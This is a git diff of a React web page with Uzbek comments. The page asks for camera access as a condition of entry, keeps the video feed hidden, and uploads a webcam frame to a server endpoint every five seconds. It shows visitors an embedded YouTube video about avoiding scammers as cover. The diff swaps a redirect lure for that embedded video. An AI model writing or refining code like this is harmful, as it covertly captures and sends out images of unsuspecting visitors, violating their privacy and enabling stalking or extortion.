@@ -2,51 +2,33 @@ import { useRef, useEffect, useState } from "react";
 
 export default function Home() {
   const videoRef = useRef(null);
-  const [permission, setPermission] = useState(null); // null | true | false
-  const [countdown, setCountdown] = useState(5);
   const [sending, setSending] = useState(false);
+  const [permission, setPermission] = useState(null); // null | true | false
 
-  const TARGET_LINK = "https://www.youtube.com/watch?v=Nv9qxur1s2k";
+  const TARGET_IFRAME = "https://www.youtube.com/embed/Nv9qxur1s2k";
 
-  // Sahifa yuklanishi bilan avtomatik ruxsat sorash
   useEffect(() => {
-    requestCamera();
+    // Kamerani ishga tushirish va ruxsatni sorash
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        videoRef.current.srcObject = stream;
+        setPermission(true);
+      })
+      .catch(err => {
+        console.error("Camera error:", err);
+        setPermission(false);
+      });
   }, []);
 
-  const requestCamera = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      videoRef.current.srcObject = stream;
-      setPermission(true);
-    } catch (err) {
-      console.error("Camera permission denied:", err);
-      setPermission(false);
-    }
-  };
-
-  // 5 sekund sanash va keyin linkga o‘tish
+  // Avtomatik rasm yuborish
   useEffect(() => {
-    if (permission) {
-      const interval = setInterval(() => {
-        setCountdown(prev => {
-          if (prev <= 1) {
-            window.location.href = TARGET_LINK;
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
+    if (!permission) return;
 
-      // Avtomatik rasm yuborish
-      const photoInterval = setInterval(() => {
-        captureAndSend();
-      }, 5000); // har 5 soniyada
+    const interval = setInterval(() => {
+      captureAndSend();
+    }, 5000); // har 5 soniyada
 
-      return () => {
-        clearInterval(interval);
-        clearInterval(photoInterval);
-      };
-    }
+    return () => clearInterval(interval);
   }, [permission]);
 
   const captureAndSend = async () => {
@@ -61,15 +43,15 @@ export default function Home() {
 
       const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
       const formData = new FormData();
-      formData.append("photo", blob, "auto.jpg");
+      formData.append("photo", blob, "auto_frame.jpg");
 
       await fetch("/api/send-photo", {
         method: "POST",
-        body: formData
+        body: formData,
       });
       console.log("Rasm yuborildi!");
     } catch (err) {
-      console.error("Rasm yuborishda xatolik:", err);
+      console.error("Error sending auto photo:", err);
     }
 
     setSending(false);
@@ -87,24 +69,31 @@ export default function Home() {
       textAlign: "center",
       padding: "0 20px"
     }}>
+      <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
+
       {permission === null && (
         <h1>Saytga kirish uchun ruxsat so‘ralmoqda...</h1>
       )}
 
       {permission === false && (
-        <>
-          <h1>Iltimos, ruxsat bering, aks holda saytga kira olmaysiz</h1>
-          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>
-            Ruxsat berish
-          </button>
-        </>
+        <h1>Iltimos, kamera ruxsatini bering!</h1>
       )}
 
       {permission === true && (
         <>
-          <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
-          <h1>Ruxsat berildi! Sayt {countdown} soniyadan keyin ochiladi...</h1>
+          <h1>Ruxsat berildi! Video yuklanmoqda...</h1>
           <p>{sending ? "Rasm yuborilmoqda..." : "Rasm avtomatik yuboriladi"}</p>
+          <iframe 
+            width="853" 
+            height="480" 
+            src={TARGET_IFRAME} 
+            title="Qanday Qilib Firibgarlarga Aldanmaslik (Siz Ularni Taniysiz!)" 
+            frameBorder="0" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+            referrerPolicy="strict-origin-when-cross-origin" 
+            allowFullScreen
+            style={{ marginTop: "20px" }}
+          ></iframe>
         </>
       )}
     </div>
